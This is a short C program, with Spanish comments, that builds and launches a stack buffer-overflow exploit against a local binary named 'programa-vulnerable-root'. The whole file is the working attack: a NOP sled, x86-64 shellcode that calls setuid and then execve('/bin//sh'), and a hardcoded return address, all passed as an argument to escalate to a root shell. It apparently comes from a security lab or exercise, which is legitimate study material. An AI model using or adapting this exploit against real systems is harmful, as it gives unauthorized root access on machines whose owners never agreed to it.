#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {

    size_t payload_size = 13 + 20 + 31 + 8 + 6;  // 31 bytes de shellcode
    char *payload = (char *)malloc(payload_size + 1);  // +1 para el NULL del final


    memset(payload, 0x90, 13);  // NOP del principio

     memcpy(payload + 13,
     "\x48\x31\xc0\x48\x31\xff\xb0\x6b\x0f\x05"
     "\x48\x89\xc7\x48\x31\xc0\xb0\x69\x0f\x05",
     20);


    // Shellcode
    memcpy(payload + 13 + 20,
        "\x48\x31\xc0\xb0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x2f\x62\x69"
        "\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05",
        31);

    memset(payload + 13 + 20 + 31, 0x90, 8);  // NOP del final

    // Direcci√≥n de retorno
    memcpy(payload + 13 + 20 + 31 + 8, "\xe0\xe2\xff\xff\xff\x7f", 6);

    payload[payload_size] = '\0';

    // Ejecutar
    char *args[] = {"./programa-vulnerable-root", payload, NULL};
    execv(args[0], args);

    free(payload);
    return 0;
}